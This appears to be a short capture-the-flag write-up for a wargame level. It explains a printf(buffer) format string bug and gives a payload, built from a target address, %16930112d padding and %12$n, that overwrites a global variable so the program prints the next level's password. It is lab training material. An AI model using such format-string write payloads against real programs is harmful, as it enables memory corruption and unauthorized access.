# Vulnerability Summary

## What is it?

Same as Level3: Format String Vulnerability using `printf(buffer)`.

## The Condition
```c
if (global_variable == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
}
```

- **Variable address:** `0x8049810`
- **Required value:** `16930116` (0x1025544)

## The Problem

We need to write `16930116`, but printing that many characters is impossible.

## The Solution

Use `%Xd` to print X characters without actually writing them:
```c
printf("%10d", 5);  // Prints "         5" (10 characters)
```

## The Payload
```
[address] + [%16930112d] + [%12$n]
 4 bytes     16930112 chars
```

| Part | Purpose | Characters |
|------|---------|------------|
| `\x10\x98\x04\x08` | Address to write | 4 |
| `%16930112d` | Print padding | 16930112 |
| `%12$n` | Write total to address | 0 |

**Total:** 4 + 16930112 = **16930116** ✅

## Result

1. `printf` counts 16930116 characters
2. `%12$n` writes 16930116 to `0x8049810`
3. Condition is true
4. `system()` executes and prints the password
